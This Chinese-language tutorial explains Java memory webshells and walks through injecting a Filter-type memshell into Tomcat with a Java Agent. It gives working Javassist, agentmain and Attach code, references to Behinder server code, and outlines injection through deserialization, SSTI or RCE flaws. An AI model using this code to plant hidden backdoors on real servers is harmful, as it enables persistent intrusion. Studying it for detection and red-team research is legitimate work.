引言

在Web安全领域，Webshell一直是攻防双方博弈的焦点。传统的文件型Webshell（如一句话木马、小马、大马）尽管功能强大，但随着防火墙、IDS/IPS、流量分析设备以及杀毒软件的普及，其明文传输和文件落地的特性使其极易被检测和查杀。为了应对这一挑战，攻击者不断进化技术，从加密一句话木马到无文件内存马，实现了对传统防御体系的突破。内存马（Memory Webshell）作为一种无文件攻击技术，将恶意代码直接注入到运行中的Web应用程序内存中，不在磁盘上留下任何痕迹，从而绕过了文件监控和杀毒软件。

内存马的实现离不开Java平台的动态增强技术——Java Agent。本文将从理论层面剖析内存马的原理，深入探讨Java Agent的两种加载方式（premain和agentmain），并结合实际案例演示如何利用Agent技术注入Filter类型的内存马，最后介绍一些开源工具和实战思路，帮助读者全面理解这一高阶攻防技术。

1. 内存马技术概览

1.1 内存马的诞生背景

传统Webshell的典型工作流程是：攻击者上传一个脚本文件到服务器（如JSP、PHP），然后通过HTTP请求携带参数与该脚本交互，执行系统命令或恶意代码。这种模式存在两个致命缺陷：

· 文件落地：Webshell文件明文存储在服务器磁盘上，杀毒软件可以通过文件特征扫描轻松查杀。
· 流量特征明显：请求中往往包含明显的参数（如cmd、pass），流量监测设备可以轻易识别。

尽管加密一句话木马（如冰蝎、哥斯拉）通过加密流量和动态密钥缓解了流量特征问题，但文件落地依然无法规避。因此，无文件内存马应运而生——它不再依赖磁盘文件，而是将恶意逻辑直接注册到内存中的Web组件里。

1.2 内存马的原理与类型

内存马的核心思想类似于MVC架构中的路由映射：攻击者在Web容器（如Tomcat、Jetty）或框架（如Spring、Struts2）内部动态注册一个额外的路由（如Servlet、Filter、Listener），当用户访问特定路径时，容器将请求路由到攻击者注册的组件，从而执行恶意代码。

根据注入目标的不同，Java内存马主要分为以下几类：

· Servlet型：动态注册一个Servlet，通过特定URL映射访问。
· Filter型：注册一个Filter，拦截匹配的请求路径，在过滤器链中执行恶意逻辑。
· Listener型：注册监听器，在特定事件（如请求初始化）时触发。
· 框架型：针对Spring MVC、Struts2等框架，通过注入Controller或Interceptor实现。

目前，Filter型内存马最为常见，因为Filter可以拦截几乎所有请求，且注册相对简单。

1.3 内存马的生成工具

为了方便生成和植入内存马，安全研究者开发了许多工具：

· MemShellParty：支持多种内存马生成和注入。
· java-memshell-generator：可生成适用于不同容器和框架的内存马代码。

这些工具通常需要先上传一个脚本文件来执行内存马植入，但如果结合已知漏洞（如反序列化、SSTI、RCE），则可以直接在漏洞利用过程中完成内存马注入，实现无文件攻击。

2. Java Agent技术详解

Java Agent是Java平台提供的一种机制，允许在JVM启动后或运行时修改已加载的类字节码。它广泛应用于APM（应用性能监控）、热部署、调试工具等领域。在攻防对抗中，Java Agent是实现内存马注入的核心技术之一。

2.1 Java Agent的两种加载方式

Java Agent支持两种加载模式：premain（启动时加载）和agentmain（运行时附加）。

2.1.1 Premain：启动时加载

通过在JVM启动参数中添加-javaagent:path/to/agent.jar，在main方法执行之前调用Agent的premain方法。这种方式适用于需要在应用启动时就完成字节码增强的场景。

示例代码：

```java
public class PremainAgent {
    public static void premain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new MyClassTransformer(), true);
        System.out.println("Premain Agent loaded.");
    }
}
```

编译打包成JAR（需在MANIFEST.MF中指定Premain-Class），然后运行：

```bash
java -javaagent:myagent.jar -cp . com.example.Main
```

2.1.2 Agentmain：运行时附加

通过Attach API动态连接到已运行的JVM进程，加载Agent。这种方式无需重启目标JVM，非常适合对线上服务进行动态诊断或攻击。

实现步骤：

1. 编写Agent类，包含agentmain方法：

```java
public class AgentmainAgent {
    public static void agentmain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new MyTransformer(), true);
        // 对已加载的类进行重转换
        for (Class<?> clazz : inst.getAllLoadedClasses()) {
            if (clazz.getName().equals("com.example.TargetClass")) {
                try {
                    inst.retransformClasses(clazz);
                } catch (UnmodifiableClassException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
```

1. 编写Attach程序，使用VirtualMachine类附加到目标进程：

```java
import com.sun.tools.attach.*;

public class Attacher {
    public static void main(String[] args) throws Exception {
        VirtualMachine vm = VirtualMachine.attach("PID"); // 目标JVM进程ID
        vm.loadAgent("/path/to/agent.jar");
        vm.detach();
    }
}
```

1. 依赖配置：由于tools.jar不在标准类路径中，需在pom.xml中添加：

```xml
<dependency>
    <groupId>com.sun</groupId>
    <artifactId>tools</artifactId>
    <version>1.8</version>
    <scope>system</scope>
    <systemPath>${java.home}/../lib/tools.jar</systemPath>
</dependency>
```

2.2 Instrumentation与字节码修改

无论是premain还是agentmain，核心都是通过Instrumentation接口注册ClassFileTransformer，在类加载或重定义时修改字节码。常用的字节码操作库有Javassist、ASM等。下文将以Javassist为例演示如何注入Filter内存马。

3. 实战：利用Java Agent注入Filter内存马

本节将通过一个完整的案例，展示如何编写Agent并在运行时动态注入一个冰蝎兼容的Filter内存马。案例假设目标Web应用运行在Tomcat上，我们将通过agentmain方式附加到目标JVM，修改已有Filter或添加新的Filter，实现内存马功能。

3.1 环境准备

· JDK 1.8
· Tomcat 8.x（或其他Servlet容器）
· 冰蝎内存马项目：https://github.com/rebeyond/memShell （用于生成冰蝎服务端）

3.2 编写字节码转换器

我们使用Javassist来动态创建一个Filter类，并将其注册到Tomcat的ApplicationFilterChain中。关键步骤如下：

3.2.1 添加Javassist依赖

```xml
<dependency>
    <groupId>org.javassist</groupId>
    <artifactId>javassist</artifactId>
    <version>3.30.2-GA</version>
</dependency>
```

3.2.2 实现ClassFileTransformer

```java
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;
import javassist.*;

public class FilterInjectTransformer implements ClassFileTransformer {
    private static final String TARGET_CLASS = "org.apache.catalina.core.ApplicationFilterChain";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] classfileBuffer)
            throws IllegalClassFormatException {
        className = className.replace('/', '.');
        if (!TARGET_CLASS.equals(className)) {
            return null;
        }
        try {
            ClassPool cp = ClassPool.getDefault();
            CtClass ctClass = cp.get(TARGET_CLASS);
            // 获取doFilter方法
            CtMethod method = ctClass.getDeclaredMethod("doFilter");
            method.insertBefore("{ " +
                    "javax.servlet.http.HttpServletRequest req = $1;" +
                    "javax.servlet.http.HttpServletResponse res = $2;" +
                    "String path = req.getRequestURI();" +
                    "if (path.contains(\"/memShell\")) {" +
                    "    // 这里插入冰蝎的恶意代码逻辑，或简单的命令执行" +
                    "    res.getWriter().write(\"Hacked by Memory Shell\");" +
                    "    return;" +
                    "}" +
                    "}");
            byte[] byteCode = ctClass.toBytecode();
            ctClass.detach();
            return byteCode;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
```

上述代码在ApplicationFilterChain.doFilter方法开头插入一段逻辑：如果请求URI包含/memShell，则直接返回响应，不再执行后续过滤器链。实际攻击中，我们可以将冰蝎的服务端代码嵌入此处，实现加密通信。

3.3 编写Agentmain并打包

Agent类：

```java
import java.lang.instrument.Instrumentation;

public class MemShellAgent {
    public static void agentmain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new FilterInjectTransformer(), true);
        // 尝试重转换已加载的ApplicationFilterChain类
        try {
            Class<?> clazz = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            inst.retransformClasses(clazz);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

MANIFEST.MF（使用maven-assembly-plugin或手动指定）：

```
Manifest-Version: 1.0
Agent-Class: MemShellAgent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

打包成包含依赖的JAR。

3.4 动态注入

将Agent JAR上传到目标服务器（或通过漏洞下载），编写Attach程序（需在目标环境运行），或直接使用jsp脚本执行Attach（如通过文件上传漏洞执行JSP代码）。

Attach示例（本地测试）：

```java
import com.sun.tools.attach.VirtualMachine;

public class AttachMain {
    public static void main(String[] args) throws Exception {
        VirtualMachine vm = VirtualMachine.attach("12345"); // Tomcat的PID
        vm.loadAgent("/path/to/memshell-agent.jar");
        vm.detach();
    }
}
```

执行后，访问http://target:8080/app/memShell，即可看到注入的响应，证明内存马生效。

3.5 冰蝎内存马集成

实际攻击中，通常需要完整的冰蝎功能。可以参考rebeyond/memShell项目，该项目提供了内存马形式的冰蝎服务端代码。将其核心逻辑（如解密、执行命令）嵌入到Filter的拦截逻辑中，即可实现内存中的冰蝎马。

4. 进阶思考：利用漏洞直接注入

通过上述案例，我们了解了如何编写Agent并手动附加。但在真实渗透中，我们往往需要借助目标系统的漏洞（如反序列化、SSTI、RCE）来完成注入，避免上传Agent JAR文件。常见思路包括：

· 反序列化漏洞：利用反序列化链，通过反射调用VirtualMachine.attach并加载远程Agent（需目标有tools.jar）。
· 表达式注入（SSTI）：在模板引擎中执行Java代码，动态加载Agent。
· 命令执行：通过系统命令下载Agent JAR并执行Attach。

这些方法的核心都是利用漏洞将Agent逻辑以字节码形式注入到目标JVM，实现无文件攻击。

5. 总结

本文从内存马的背景入手，详细介绍了Java Agent技术的两种加载方式，并通过实战案例演示了如何利用Agent注入Filter内存马。内存马作为无文件攻击的重要技术，已经广泛应用于红队实战和攻防演练中。掌握Java Agent和字节码操作，不仅有助于深入理解JVM运行机制，也能提升安全研究人员在攻防对抗中的技术深度。

同时，防御方也应关注内存马的检测与防御，例如通过对比类加载器、监控Instrumentation注册、扫描内存中的恶意Filter等手段来发现异常。攻防双方的技术博弈，正是在这种互相促进中不断演进的。

参考资料

· Java Agent 官方文档
· Javassist 官方文档
· MemShellParty
· java-memshell-generator
· 冰蝎内存马

（注：本文所述技术仅用于安全研究和授权测试，请勿用于非法用途。）
